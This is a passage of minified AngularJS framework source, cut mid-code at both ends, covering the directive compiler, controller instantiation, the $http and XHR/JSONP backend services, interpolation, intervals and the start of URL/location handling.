e=t.instance;if(j(e.$onChanges))try{e.$onChanges(t.bindingInfo.initialChanges)}catch(t){m(t)}if(j(e.$onInit))try{e.$onInit()}catch(t){m(t)}j(e.$doCheck)&&(f.$watch((function(){e.$doCheck()})),e.$doCheck()),j(e.$onDestroy)&&f.$on("$destroy",(function(){e.$onDestroy()}))})),c=0,u=l.length;c<u;c++)Nt(d=l[c],d.isolateScope?p:e,E,A,d.require&&_t(d.directiveName,d.require,E,g),y);var M=e;for(b&&(b.template||null===b.templateUrl)&&(M=p),t&&t(M,n.childNodes,void 0,a),c=h.length-1;c>=0;c--)Nt(d=h[c],d.isolateScope?p:e,E,A,d.require&&_t(d.directiveName,d.require,E,g),y);S(g,(function(t){var e=t.instance;j(e.$postLink)&&e.$postLink()}))}}function _t(t,e,i,r){var n;if(U(e)){var s=e.match(c),o=e.substring(s[0].length),a=s[1]||s[3],l="?"===s[2];if("^^"===a?i=i.parent():n=(n=r&&r[o])&&n.instance,!n){var h="$"+o+"Controller";n="^^"===a&&i[0]&&9===i[0].nodeType?null:a?i.inheritedData(h):i.data(h)}if(!n&&!l)throw mi("ctreq","Controller '{0}', required by directive '{1}', can't be found!",o,t)}else if(G(e)){n=[];for(var u=0,d=e.length;u<d;u++)n[u]=_t(t,e[u],i,r)}else q(e)&&(n={},S(e,(function(e,s){n[s]=_t(t,e,i,r)})));return n||null}function bt(t,e,i){for(var r=0,n=t.length;r<n;r++)t[r]=M(t[r],{$$isolateScope:e,$$newScope:i})}function Et(t,i,s,o,a,l,h){if(i===a)return null;var c=null;if(r.hasOwnProperty(i))for(var u,d=e.get(i+n),p=0,m=d.length;p<m;p++)if(u=d[p],(F(o)||o>u.priority)&&-1!==u.restrict.indexOf(s)){if(l&&(u=M(u,{$$start:l,$$end:h})),!u.$$bindings){var f=u.$$bindings=g(u,u.name);q(f.isolateScope)&&(u.$$isolateBindings=f.isolateScope)}t.push(u),c=u}return c}function St(t){if(r.hasOwnProperty(t))for(var i=e.get(t+n),s=0,o=i.length;s<o;s++)if(i[s].multiElement)return!0;return!1}function At(t,e){var i=e.$attr,r=t.$attr;S(t,(function(r,n){"$"!==n.charAt(0)&&(e[n]&&e[n]!==r&&(r.length?r+=("style"===n?";":" ")+e[n]:r=e[n]),t.$set(n,r,!0,i[n]))})),S(e,(function(e,n){!t.hasOwnProperty(n)&&"$"!==n.charAt(0)&&(t[n]=e,"class"!==n&&"style"!==n&&(r[n]=i[n]))}))}function Ct(t,e,i,r,n,s,a,l){var h,c,u=[],d=e[0],p=t.shift(),g=M(p,{templateUrl:null,transclude:null,replace:null,$$originalDirective:p}),y=j(p.templateUrl)?p.templateUrl(e,i):p.templateUrl,v=p.templateNamespace;return e.empty(),f(y).then((function(m){var f,_,b,w;if(m=et(m),p.replace){if(b=he(m)?[]:Ei(It(v,tt(m))),f=b[0],1!==b.length||1!==f.nodeType)throw mi("tplrt","Template for directive '{0}' must have exactly one root element. {1}",p.name,y);_={$attr:{}},Dt(r,e,f);var E=mt(f,[],_);q(p.scope)&&bt(E,!0),t=E.concat(t),At(i,_)}else f=d,e.html(m);for(t.unshift(g),h=vt(t,f,i,n,e,p,s,a,l),S(r,(function(t,i){t===f&&(r[i]=e[0])})),c=ht(e[0].childNodes,n);u.length;){var A=u.shift(),C=u.shift(),T=u.shift(),$=u.shift(),I=e[0];if(!A.$$destroyed){if(C!==d){var P=C.className;l.hasElementTranscludeDirective&&p.replace||(I=me(f)),Dt(T,o(C),I),X(o(I),P)}w=h.transcludeOnThisElement?ut(A,h.transclude,$):$,h(c,A,I,r,w)}}u=null})).catch((function(t){z(t)&&m(t)})),function(t,e,i,r,n){var s=n;e.$$destroyed||(u?u.push(e,i,r,s):(h.transcludeOnThisElement&&(s=ut(e,h.transclude,n)),h(c,e,i,r,s)))}}function Tt(t,e){var i=e.priority-t.priority;return 0!==i?i:t.name!==e.name?t.name<e.name?-1:1:t.index-e.index}function $t(t,e,i,r){function n(t){return t?" (module: "+t+")":""}if(e)throw mi("multidir","Multiple directives [{0}{1}, {2}{3}] asking for {4} on: {5}",e.name,n(e.$$moduleName),i.name,n(i.$$moduleName),t,wt(r))}function It(e,i){switch(e=d(e||"html")){case"svg":case"math":var r=t.document.createElement("div");return r.innerHTML="<"+e+">"+i+"</"+e+">",r.childNodes[0].childNodes;default:return i}}function Pt(t){return H(I.valueOf(t),"ng-prop-srcset")}function xt(t,e,i,r){if(p.test(r))throw mi("nodomevents","Property bindings for HTML DOM event properties are disallowed");var n=rt(t),s=function(t,e){var i=e.toLowerCase();return A[t+"|"+i]||A["*|"+i]}(n,r),o=R;"srcset"!==r||"img"!==n&&"source"!==n?s&&(o=I.getTrusted.bind(I,s)):o=Pt,e.push({priority:100,compile:function(t,e){var n=C(e[i]),s=C(e[i],(function(t){return I.valueOf(t)}));return{pre:function(t,e){function i(){var i=n(t);e[0][r]=o(i)}i(),t.$watch(s,i)}}}})}function kt(t,e,i){t.push(Ls(C,$,m,e,i,!1))}function Ot(t,e,r,n,s){var o=rt(t),a=function(t,e){return"srcdoc"===e?I.HTML:"src"===e||"ngSrc"===e?-1===["img","video","audio","source","track"].indexOf(t)?I.RESOURCE_URL:I.MEDIA_URL:"xlinkHref"===e?"image"===t?I.MEDIA_URL:"a"===t?I.URL:I.RESOURCE_URL:"form"===t&&"action"===e||"base"===t&&"href"===e||"link"===t&&"href"===e?I.RESOURCE_URL:"a"!==t||"href"!==e&&"ngHref"!==e?void 0:I.URL}(o,n),l=!s,c=h[n]||s,u=i(r,l,a,c);if(u){if("multiple"===n&&"select"===o)throw mi("selmulti","Binding to the 'multiple' attribute is not supported. Element: {0}",wt(t));if(p.test(n))throw mi("nodomevents","Interpolations for HTML DOM event attributes are disallowed");e.push({priority:100,compile:function(){return{pre:function(t,e,s){var o=s.$$observers||(s.$$observers=qt()),l=s[n];l!==r&&(u=l&&i(l,!0,a,c),r=l),u&&(s[n]=u(t),(o[n]||(o[n]=[])).$$inter=!0,(s.$$observers&&s.$$observers[n].$$scope||t).$watch(u,(function(t,e){"class"===n&&t!==e?s.$updateClass(t,e):s.$set(n,t)})))}}}})}}function Dt(e,i,r){var n,s,a=i[0],l=i.length,h=a.parentNode;if(e)for(n=0,s=e.length;n<s;n++)if(e[n]===a){e[n++]=r;for(var c=n,u=c+l-1,d=e.length;c<d;c++,u++)u<d?e[c]=e[u]:delete e[c];e.length-=l-1,e.context===a&&(e.context=r);break}h&&h.replaceChild(r,a);var p=t.document.createDocumentFragment();for(n=0;n<l;n++)p.appendChild(i[n]);for(o.hasData(a)&&(o.data(r,o.data(a)),o(a).off("$destroy")),o.cleanData(p.querySelectorAll("*")),n=1;n<l;n++)delete i[n];i[0]=r,i.length=1}function Rt(t,e){return P((function(){return t.apply(null,arguments)}),t,e)}function Nt(t,e,i,r,n,s){try{t(e,i,r,n,s)}catch(t){m(t,wt(i))}}function Ft(t,e){if(_)throw mi("missingattr","Attribute '{0}' of '{1}' is non-optional and must be set!",t,e)}function Vt(t,e,r,n,s){var o,a=[],l={};function h(e,i,n){j(r.$onChanges)&&!at(i,n)&&(k||(t.$$postDigest(W),k=[]),o||(o={},k.push(c)),o[e]&&(n=o[e].previousValue),o[e]=new yi(n,i))}function c(){r.$onChanges(o),o=void 0}return S(n,(function(n,o){var c,d,p,m,f,g=n.attrName,y=n.optional;switch(n.mode){case"@":!y&&!u.call(e,g)&&(Ft(g,s.name),r[o]=e[g]=void 0),f=e.$observe(g,(function(t){if(U(t)||K(t)){var e=r[o];h(o,t,e),r[o]=t}})),e.$$observers[g].$$scope=t,U(c=e[g])?r[o]=i(c)(t):K(c)&&(r[o]=c),l[o]=new yi(fi,r[o]),a.push(f);break;case"=":if(!u.call(e,g)){if(y)break;Ft(g,s.name),e[g]=void 0}if(y&&!e[g])break;d=C(e[g]),m=d.literal?lt:at,p=d.assign||function(){throw c=r[o]=d(t),mi("nonassign","Expression '{0}' in attribute '{1}' used with directive '{2}' is non-assignable!",e[g],g,s.name)},c=r[o]=d(t);var v=function(e){return m(e,r[o])||(m(e,c)?p(t,e=r[o]):r[o]=e),c=e};v.$stateful=!0,f=n.collection?t.$watchCollection(e[g],v):t.$watch(C(e[g],v),null,d.literal),a.push(f);break;case"<":if(!u.call(e,g)){if(y)break;Ft(g,s.name),e[g]=void 0}if(y&&!e[g])break;var _=(d=C(e[g])).literal,b=r[o]=d(t);l[o]=new yi(fi,r[o]),f=t[n.collection?"$watchCollection":"$watch"](d,(function(t,e){if(e===t){if(e===b||_&&lt(e,b))return;e=b}h(o,t,e),r[o]=t})),a.push(f);break;case"&":if(!y&&!u.call(e,g)&&Ft(g,s.name),(d=e.hasOwnProperty(g)?C(e[g]):D)===D&&y)break;r[o]=function(e){return d(t,e)}}})),{initialChanges:l,removeWatches:a.length&&function(){for(var t=0,e=a.length;t<e;++t)a[t]()}}}}]}function yi(t,e){this.previousValue=t,this.currentValue=e}gi.$inject=["$provide","$$sanitizeUriProvider"],yi.prototype.isFirstChange=function(){return this.previousValue===fi};var vi=/^((?:x|data)[:\-_])/i,_i=/[:\-_]+(.)/g;function bi(t){return t.replace(vi,"").replace(_i,(function(t,e,i){return i?e.toUpperCase():e}))}function wi(t,e){var i="",r=t.split(/\s+/),n=e.split(/\s+/);t:for(var s=0;s<r.length;s++){for(var o=r[s],a=0;a<n.length;a++)if(o===n[a])continue t;i+=(i.length>0?" ":"")+o}return i}function Ei(t){var e=(t=o(t)).length;if(e<=1)return t;for(;e--;){var i=t[e];(8===i.nodeType||i.nodeType===Ut&&""===i.nodeValue.trim())&&f.call(t,e,1)}return t}var Si=n("$controller"),Ai=/^(\S+)(\s+as\s+([\w$]+))?$/;function Ci(t,e){if(e&&U(e))return e;if(U(t)){var i=Ai.exec(t);if(i)return i[3]}}function Ti(){var t={};this.has=function(e){return t.hasOwnProperty(e)},this.register=function(e,i){Ft(e,"controller"),q(e)?P(t,e):t[e]=i},this.$get=["$injector",function(e){return function(r,n,s,o){var a,l,h,c;if(s=!0===s,o&&U(o)&&(c=o),U(r)){if(!(l=r.match(Ai)))throw Si("ctrlfmt","Badly formed controller string '{0}'. Must match `__name__ as __id__` or `__name__`.",r);if(h=l[1],c=c||l[3],!(r=t.hasOwnProperty(h)?t[h]:function(t,e,i){if(!e)return t;for(var r,n=e.split("."),s=t,o=n.length,a=0;a<o;a++)r=n[a],t&&(t=(s=t)[r]);return!i&&j(t)?pt(s,t):t}(n.$scope,h,!0)))throw Si("ctrlreg","The controller with the name '{0}' is not registered.",h);Nt(r,h,!0)}if(s){var u=(G(r)?r[r.length-1]:r).prototype;return a=Object.create(u||null),c&&i(n,c,a,h||r.name),P((function(){var t=e.invoke(r,a,n,h);return t!==a&&(q(t)||j(t))&&(a=t,c&&i(n,c,a,h||r.name)),a}),{instance:a,identifier:c})}return a=e.instantiate(r,n,h),c&&i(n,c,a,h||r.name),a};function i(t,e,i,r){if(!t||!q(t.$scope))throw n("$controller")("noscp","Cannot export controller '{0}' as '{1}'! No $scope object provided via `locals`.",r,e);t.$scope[e]=i}}]}function $i(){this.$get=["$window",function(t){return o(t.document)}]}function Ii(){this.$get=["$document","$rootScope",function(t,e){var i=t[0],r=i&&i.hidden;function n(){r=i.hidden}return t.on("visibilitychange",n),e.$on("$destroy",(function(){t.off("visibilitychange",n)})),function(){return r}}]}function Pi(){this.$get=["$log",function(t){return function(e,i){t.error.apply(t,arguments)}}]}var xi=function(){this.$get=["$document",function(t){return function(e){return e?!e.nodeType&&e instanceof o&&(e=e[0]):e=t[0].body,e.offsetWidth+1}}]},ki="application/json",Oi={"Content-Type":ki+";charset=utf-8"},Mi=/^\[|^\{(?!\{)/,Di={"[":/]$/,"{":/}$/},Ri=/^\)]\}',?\n/,Li=n("$http");function Ni(t){return q(t)?H(t)?t.toISOString():ft(t):t}function Fi(){this.$get=function(){return function(t){if(!t)return"";var e=[];return A(t,(function(t,i){null===t||F(t)||j(t)||(G(t)?S(t,(function(t){e.push(Ct(i)+"="+Ct(Ni(t)))})):e.push(Ct(i)+"="+Ct(Ni(t))))})),e.join("&")}}}function Vi(){this.$get=function(){return function(t){if(!t)return"";var e=[];return function t(i,r,n){G(i)?S(i,(function(e,i){t(e,r+"["+(q(e)?i:"")+"]")})):q(i)&&!H(i)?A(i,(function(e,i){t(e,r+(n?"":"[")+i+(n?"":"]"))})):(j(i)&&(i=i()),e.push(Ct(r)+"="+(null==i?"":Ct(Ni(i)))))}(t,"",!0),e.join("&")}}}function qi(t,e){if(U(t)){var i=t.replace(Ri,"").trim();if(i){var r=e("Content-Type"),n=r&&0===r.indexOf(ki);if(n||function(t){var e=t.match(Mi);return e&&Di[e[0]].test(t)}(i))try{t=gt(i)}catch(e){if(!n)return t;throw Li("baddata",'Data must be a valid JSON object. Received: "{0}". Parse error: "{1}"',t,e)}}}return t}function Bi(t){var e,i=qt();function r(t,e){t&&(i[t]=i[t]?i[t]+", "+e:e)}return U(t)?S(t.split("\n"),(function(t){e=t.indexOf(":"),r(d(tt(t.substr(0,e))),tt(t.substr(e+1)))})):q(t)&&S(t,(function(t,e){r(d(e),tt(t))})),i}function Ui(t){var e;return function(i){if(e||(e=Bi(t)),i){var r=e[d(i)];return void 0===r&&(r=null),r}return e}}function Wi(t,e,i,r){return j(r)?r(t,e,i):(S(r,(function(r){t=r(t,e,i)})),t)}function Hi(t){return 200<=t&&t<300}function Gi(){var t=this.defaults={transformResponse:[qi],transformRequest:[function(t){return!q(t)||function(t){return"[object File]"===y.call(t)}(t)||function(t){return"[object Blob]"===y.call(t)}(t)||function(t){return"[object FormData]"===y.call(t)}(t)?t:ft(t)}],headers:{common:{Accept:"application/json, text/plain, */*"},post:Wt(Oi),put:Wt(Oi),patch:Wt(Oi)},xsrfCookieName:"XSRF-TOKEN",xsrfHeaderName:"X-XSRF-TOKEN",paramSerializer:"$httpParamSerializer",jsonpCallbackParam:"callback"},e=!1;this.useApplyAsync=function(t){return V(t)?(e=!!t,this):e};var i=this.interceptors=[],r=this.xsrfTrustedOrigins=[];Object.defineProperty(this,"xsrfWhitelistedOrigins",{get:function(){return this.xsrfTrustedOrigins},set:function(t){this.xsrfTrustedOrigins=t}}),this.$get=["$browser","$httpBackend","$$cookieReader","$cacheFactory","$rootScope","$q","$injector","$sce",function(s,o,a,l,h,c,u,m){var f=l("$http");t.paramSerializer=U(t.paramSerializer)?u.get(t.paramSerializer):t.paramSerializer;var g=[];S(i,(function(t){g.unshift(U(t)?u.get(t):u.invoke(t))}));var y=function(t){var e=[hn].concat(t.map(un));return function(t){var i=un(t);return e.some(dn.bind(null,i))}}(r);function v(i){if(!q(i))throw n("$http")("badreq","Http request configuration must be an object.  Received: {0}",i);if(!U(m.valueOf(i.url)))throw n("$http")("badreq","Http request configuration url must be a string or a $sce trusted object.  Received: {0}",i.url);var r=P({method:"get",transformRequest:t.transformRequest,transformResponse:t.transformResponse,paramSerializer:t.paramSerializer,jsonpCallbackParam:t.jsonpCallbackParam},i);r.headers=function(e){var i,r,n,s=t.headers,o=P({},e.headers);s=P({},s.common,s[d(e.method)]);t:for(i in s){for(n in r=d(i),o)if(d(n)===r)continue t;o[i]=s[i]}return function(t,e){var i,r={};return S(t,(function(t,n){j(t)?null!=(i=t(e))&&(r[n]=i):r[n]=t})),r}(o,Wt(e))}(i),r.method=p(r.method),r.paramSerializer=U(r.paramSerializer)?u.get(r.paramSerializer):r.paramSerializer,s.$$incOutstandingRequestCount("$http");var l=[],_=[],b=c.resolve(r);return S(g,(function(t){(t.request||t.requestError)&&l.unshift(t.request,t.requestError),(t.response||t.responseError)&&_.push(t.response,t.responseError)})),b=(b=w(b,l)).then((function(i){var r=i.headers,n=Wi(i.data,Ui(r),void 0,i.transformRequest);return F(n)&&S(r,(function(t,e){"content-type"===d(e)&&delete r[e]})),F(i.withCredentials)&&!F(t.withCredentials)&&(i.withCredentials=t.withCredentials),function(i,r){var n,s,l=c.defer(),u=l.promise,p=i.headers,g="jsonp"===d(i.method),_=i.url;if(g?_=m.getTrustedResourceUrl(_):U(_)||(_=m.valueOf(_)),_=function(t,e){return e.length>0&&(t+=(-1===t.indexOf("?")?"?":"&")+e),t}(_,i.paramSerializer(i.params)),g&&(_=function(t,e){var i=t.split("?");if(i.length>2)throw Li("badjsonp",'Illegal use more than one "?", in url, "{1}"',t);return S(St(i[1]),(function(i,r){if("JSON_CALLBACK"===i)throw Li("badjsonp",'Illegal use of JSON_CALLBACK in url, "{0}"',t);if(r===e)throw Li("badjsonp",'Illegal use of callback param, "{0}", in url, "{1}"',e,t)})),t+=(-1===t.indexOf("?")?"?":"&")+e+"=JSON_CALLBACK"}(_,i.jsonpCallbackParam)),v.pendingRequests.push(i),u.then(T,T),(i.cache||t.cache)&&!1!==i.cache&&("GET"===i.method||"JSONP"===i.method)&&(n=q(i.cache)?i.cache:q(t.cache)?t.cache:f),n&&(V(s=n.get(_))?Z(s)?s.then(C,C):G(s)?A(s[1],s[0],Wt(s[2]),s[3],s[4]):A(s,200,{},"OK","complete"):n.put(_,u)),F(s)){var b=y(i.url)?a()[i.xsrfCookieName||t.xsrfCookieName]:void 0;b&&(p[i.xsrfHeaderName||t.xsrfHeaderName]=b),o(i.method,_,r,E,p,i.timeout,i.withCredentials,i.responseType,w(i.eventHandlers),w(i.uploadEventHandlers))}return u;function w(t){if(t){var i={};return S(t,(function(t,r){i[r]=function(i){function r(){t(i)}e?h.$applyAsync(r):h.$$phase?r():h.$apply(r)}})),i}}function E(t,i,r,s,o){function a(){A(i,t,r,s,o)}n&&(Hi(t)?n.put(_,[t,i,Bi(r),s,o]):n.remove(_)),e?h.$applyAsync(a):(a(),h.$$phase||h.$apply())}function A(t,e,r,n,s){(Hi(e=e>=-1?e:0)?l.resolve:l.reject)({data:t,status:e,headers:Ui(r),config:i,statusText:n,xhrStatus:s})}function C(t){A(t.data,t.status,Wt(t.headers()),t.statusText,t.xhrStatus)}function T(){var t=v.pendingRequests.indexOf(i);-1!==t&&v.pendingRequests.splice(t,1)}}(i,n).then(E,E)})),b=(b=w(b,_)).finally((function(){s.$$completeOutstandingRequest(D,"$http")}));function w(t,e){for(var i=0,r=e.length;i<r;){var n=e[i++],s=e[i++];t=t.then(n,s)}return e.length=0,t}function E(t){var e=P({},t);return e.data=Wi(t.data,t.headers,t.status,r.transformResponse),Hi(t.status)?e:c.reject(e)}}return v.pendingRequests=[],function(t){S(arguments,(function(t){v[t]=function(e,i){return v(P({},i||{},{method:t,url:e}))}}))}("get","delete","head","jsonp"),function(t){S(arguments,(function(t){v[t]=function(e,i,r){return v(P({},r||{},{method:t,url:e,data:i}))}}))}("post","put","patch"),v.defaults=t,v}]}function zi(){this.$get=function(){return function(){return new t.XMLHttpRequest}}}function ji(){this.$get=["$browser","$jsonpCallbacks","$document","$xhrFactory",function(t,e,i,r){return function(t,e,i,r,n){return function(n,o,a,l,h,c,u,p,m,f){if(o=o||t.url(),"jsonp"===d(n))var g=r.createCallback(o),y=s(o,g,(function(t,e){var i=200===t&&r.getResponse(g);T(l,t,i,"",e,"complete"),r.removeCallback(g)}));else{var v=e(n,o),_=!1;v.open(n,o,!0),S(h,(function(t,e){V(t)&&v.setRequestHeader(e,t)})),v.onload=function(){var t=v.statusText||"",e="response"in v?v.response:v.responseText,i=1223===v.status?204:v.status;0===i&&(i=e?200:"file"===un(o).protocol?404:0),T(l,i,e,v.getAllResponseHeaders(),t,"complete")};var b=function(){T(l,-1,null,null,"","error")},w=function(){T(l,-1,null,null,"",_?"timeout":"abort")},E=function(){T(l,-1,null,null,"","timeout")};if(v.onerror=b,v.ontimeout=E,v.onabort=w,S(m,(function(t,e){v.addEventListener(e,t)})),S(f,(function(t,e){v.upload.addEventListener(e,t)})),u&&(v.withCredentials=!0),p)try{v.responseType=p}catch(t){if("json"!==p)throw t}v.send(F(a)?null:a)}if(c>0)var A=i((function(){C("timeout")}),c);else Z(c)&&c.then((function(){C(V(c.$$timeoutId)?"timeout":"abort")}));function C(t){_="timeout"===t,y&&y(),v&&v.abort()}function T(t,e,r,n,s,o){V(A)&&i.cancel(A),y=v=null,t(e,r,n,s,o)}};function s(t,e,i){t=t.replace("JSON_CALLBACK",e);var s=n.createElement("script"),o=null;return s.type="text/javascript",s.src=t,s.async=!0,o=function(t){s.removeEventListener("load",o),s.removeEventListener("error",o),n.body.removeChild(s),s=null;var a=-1,l="unknown";t&&("load"===t.type&&!r.wasCalled(e)&&(t={type:"error"}),l=t.type,a="error"===t.type?404:200),i&&i(a,l)},s.addEventListener("load",o),s.addEventListener("error",o),n.body.appendChild(s),o}}(t,r,t.defer,e,i[0])}]}var Yi=b.$interpolateMinErr=n("$interpolate");function Xi(){var t="{{",e="}}";this.startSymbol=function(e){return e?(t=e,this):t},this.endSymbol=function(t){return t?(e=t,this):e},this.$get=["$parse","$exceptionHandler","$sce",function(i,r,n){var s=t.length,o=e.length,a=new RegExp(t.replace(/./g,h),"g"),l=new RegExp(e.replace(/./g,h),"g");function h(t){return"\\\\\\"+t}function c(i){return i.replace(a,t).replace(l,e)}function u(t,e,i,r){var n=t.$watch((function(t){return n(),r(t)}),e,i);return n}function d(a,l,h,d){var p=h===n.URL||h===n.MEDIA_URL;if(!a.length||-1===a.indexOf(t)){if(l)return;var m=c(a);p&&(m=n.getTrusted(h,m));var f=L(m);return f.exp=a,f.expressions=[],f.$$watchDelegate=u,f}d=!!d;for(var g,y,v,_,b,w=0,E=[],S=a.length,A=[],C=[];w<S;){if(-1===(g=a.indexOf(t,w))||-1===(y=a.indexOf(e,g+s))){w!==S&&A.push(c(a.substring(w)));break}w!==g&&A.push(c(a.substring(w,g))),_=a.substring(g+s,y),E.push(_),w=y+o,C.push(A.length),A.push("")}b=1===A.length&&1===C.length;var T=p&&b?void 0:function(t){try{return t=h&&!p?n.getTrusted(h,t):n.valueOf(t),d&&!V(t)?t:Bt(t)}catch(t){r(Yi.interr(a,t))}};if(v=E.map((function(t){return i(t,T)})),!l||E.length){var $=function(t){for(var e=0,i=E.length;e<i;e++){if(d&&F(t[e]))return;A[C[e]]=t[e]}return p?n.getTrusted(h,b?A[0]:A.join("")):(h&&A.length>1&&Yi.throwNoconcat(a),A.join(""))};return P((function(t){var e=0,i=E.length,n=new Array(i);try{for(;e<i;e++)n[e]=v[e](t);return $(n)}catch(t){r(Yi.interr(a,t))}}),{exp:a,expressions:E,$$watchDelegate:function(t,e){var i;return t.$watchGroup(v,(function(r,n){var s=$(r);e.call(this,s,r!==n?i:s,t),i=s}))}})}}return d.startSymbol=function(){return t},d.endSymbol=function(){return e},d}]}Yi.throwNoconcat=function(t){throw Yi("noconcat","Error while interpolating: {0}\nStrict Contextual Escaping disallows interpolations that concatenate multiple expressions when a trusted value is required.  See http://docs.angularjs.org/api/ng.$sce",t)},Yi.interr=function(t,e){return Yi("interr","Can't interpolate: {0}\n{1}",t,e.toString())};var Qi=n("$interval");function Ki(){this.$get=["$$intervalFactory","$window",function(t,e){var i={},r=function(t){e.clearInterval(t),delete i[t]},n=t((function(t,r,n){var s=e.setInterval(t,r);return i[s]=n,s}),r);return n.cancel=function(t){if(!t)return!1;if(!t.hasOwnProperty("$$intervalId"))throw Qi("badprom","`$interval.cancel()` called with a promise that was not generated by `$interval()`.");if(!i.hasOwnProperty(t.$$intervalId))return!1;var e=t.$$intervalId,n=i[e];return Br(n.promise),n.reject("canceled"),r(e),!0},n}]}function Zi(){this.$get=["$browser","$q","$$q","$rootScope",function(t,e,i,r){return function(n,s){return function(o,a,l,h){var c=arguments.length>4,u=c?dt(arguments,4):[],d=0,p=V(h)&&!h,m=(p?i:e).defer(),f=m.promise;function g(){c?o.apply(null,u):o(d)}function y(){p?t.defer(g):r.$evalAsync(g),m.notify(d++),l>0&&d>=l&&(m.resolve(d),s(f.$$intervalId)),p||r.$apply()}return l=V(l)?l:0,f.$$intervalId=n(y,a,m,p),f}}}]}var Ji=function(){this.$get=function(){var t=b.callbacks,e={};return{createCallback:function(i){var r="_"+(t.$$counter++).toString(36),n="angular.callbacks."+r,s=function(t){var e=function(t){e.data=t,e.called=!0};return e.id=t,e}(r);return e[n]=t[r]=s,n},wasCalled:function(t){return e[t].called},getResponse:function(t){return e[t].data},removeCallback:function(i){var r=e[i];delete t[r.id],delete e[i]}}}},tr=/^([^?#]*)(\?([^#]*))?(#(.*))?$/,er={http:80,https:443,ftp:21},ir=n("$location");function rr(t,e,i){var r=function(t){var e=[];return S(t,(function(t,i){G(t)?S(t,(function(t){e.push(Ct(i,!0)+(!0===t?"":"="+Ct(t,!0)))})):e.push(Ct(i,!0)+(!0===t?"":"="+Ct(t,!0)))})),e.length?e.join("&"):""}(e),n=i?"#"+At(i):"";return function(t){for(var e=t.split("/"),i=e.length;i--;)e[i]=At(e[i].replace(/%2F/g,"/"));return e.join("/")}(t)+(r?"?"+r:"")+n}function nr(t,e){var i=un(t);e.$$protocol=i.protocol,e.$$host=i.hostname,e.$$port=k(i.port)||er[i.protocol]||null}var sr=/^\s*[\\/]{2,}/;function or(t,e,i){if(sr.test(t))throw ir("badpath",'Invalid url "{0}".',t);var r="/"!==t.charAt(0);r&&(t="/"+t);var n=un(t),s=r&&"/"===n.pathname.charAt(0)?n.pathname.substring(1):n.pathname;e.$$path=function(t,e){for(var i=t.split("/"),r=i.length;r--;)i[r]=decodeURIComponent(i[r]),e&&(i[r]=i[r].replace(/\//g,"%2F"));return i.join("/")}(s,i),e.$$search=St(n.search),e.$$hash=decodeURIComponent(n.hash),e.$$path&&"/"!==e.$$path.charAt(0)&&(e.$$path="/"+e.$$path)}function ar(t,e){return t.slice(0,e.length)===e}function lr(t,e){if(ar(e,t))return e.substr(t.length)}function hr(t){var e=t.indexOf("#");return-1===e?t:t.substr(0,e)}function cr(t,e,i){this.$$html5=!0,i=i||"",nr(t,this),this.$$parse=function(t){var i=lr(e,t);if(!U(i))throw ir("ipthprfx",'Invalid url "{0}", missing path prefix "{1}".',t,e);or(i,this,!0),this.$$path||(this.$$path="/"),this.$$compose()},this.$$normalizeUrl=function(t){return e+t.substr(1)},this.$$parseLinkUrl=function(r,n){return n&&"#"===n[0]?(this.hash(n.slice(1)),!0):(V(s=lr(t,r))?(o=s,a=i&&V(s=lr(i,s))?e+(lr("/",s)||s):t+o):V(s=lr(e,r))?a=e+s:e===r+"/"&&(a=e),a&&this.$$parse(a),!!a);var s,o,a}}function ur(t,e,i){nr(t,this),this.$$parse=function(r){var n,s,o,a,l,h,c=lr(t,r)||lr(e,r);F(c)||"#"!==c.charAt(0)?this.$$html5?n=c:(n="",F(c)&&(t=r,this.replace())):F(n=lr(i,c))&&(n=c),or(n,this,!1),this.$$path=(s=this.$$path,h=/^\/[A-Z]:(\/.*)/,ar(o=n,a=t)&&(o=o.replace(a,"")),h.exec(o)?s:(l=h.exec(s))?l[1]:s),this.$$compose()},this.$$normalizeUrl=function(e){return t+(e?i+e:"")},this.$$parseLinkUrl=function(e,i){return hr(t)===hr(e)&&(this.$$parse(e),!0)}}function dr(t,e,i){this.$$html5=!0,ur.apply(this,arguments),this.$$parseLinkUrl=function(r,n){return n&&"#"===n[0]?(this.hash(n.slice(1)),!0):(t===hr(r)?s=r:(o=lr(e,r))?s=t+i+o:e===r+"/"&&(s=e),s&&this.$$parse(s),!!s);var s,o},this.$$normalizeUrl=function(e){return t+i+e}}var pr={$$absUrl:"",$$html5:!1,$$replace:!1,$$compose:function(){this.$$url=rr(this.$$path,this.$$search,this.$$hash),this.$$absUrl=this.$$normalizeUrl(this.$$url),this.$$urlUpdatedByLocation=!0},absUrl:mr("$$absUrl"),url:function(t){if(F(t))return this.$$url;var e=tr.exec(t);return(e[1]||""===t)&&this.path(decodeURIComponent(e[1])),(e[2]||e[1]||""===t)&&this.search(e[3]||""),this.hash(e[5]||""),this},protocol:mr("$$protocol"),host:mr("$$host"),port:mr("$$port"),path:fr("$$path",(function(t){return"/"===(t=null!==t?t.toString():"").charAt(0)?t:"/"+t})),search:function(t,e){switch(arguments.length){case 0:return this.$$search;case 1:if(U(t)||W(t))t=t.toString(),this.$$search=St(t);else{if(!q(t))throw ir("isrcharg","The first argument of the `$location#search()` call must be a string or an object.");S(t=ot(t,{}),(function(e,i){null==e&&delete t[i]})),this.$$search=t}break;default:F(e)||null===e?delete this.$$search[t]:this.$$search[t]=e}return this.$$compose(),this},hash:fr("$$hash",(function(t){return null!==t?t.toString():""})),replace:function(){return this.$$replace=!0,this}};function mr(t){return function(){return this[t]}}function fr(t,e){return function(i){return F(i)?this[t]:(this[t]=e(i),this.$$compose(),this)}}function gr(){var t="!",e={enabled:!1,requireBase:!0,rewriteLinks:!0};this.hashPrefix=function(e){return V(e)?(t=e,this):t},this.html5Mode=function(t){return K(t)?(e.enabled=t,this):q(t)?(K(t.enabled)&&(e.enabled=t.enabled),K(t.requireBase)&&(e.requireBase=t.requireBase),(K(t.rewriteLinks)||U(t.rewriteLinks))&&(e.rewriteLinks=t.rewriteLinks),this):e},this.$get=["$rootScope","$browser","$sniffer","$rootElement","$window",function(i,r,n,s,a){var l,h,c,u=r.baseHref(),d=r.url();if(e.enabled){if(!u&&e.requireBase)throw ir("nobase","$location in HTML5 mode requires a <base> tag to be present!");c=function(t){return t.substring(0,t.indexOf("/",t.indexOf("//")+2))}(d)+(u||"/"),h=n.history?cr:dr}else c=hr(d),h=ur;var p=function(t){return t.substr(0,hr(t).lastIndexOf("/")+1)}(c);(l=new h(c,p,"#"+t)).$$parseLinkUrl(d,d),l.$$state=r.state();var m=/^\s*(javascript|mailto):/i;function f(t,e,i){var n=l.url(),s=l.$$state;try{r.url(t,e,i),l.$$state=r.state()}catch(t){throw l.url(n),l.$$state=s,t}}s.on("click",(function(t){var 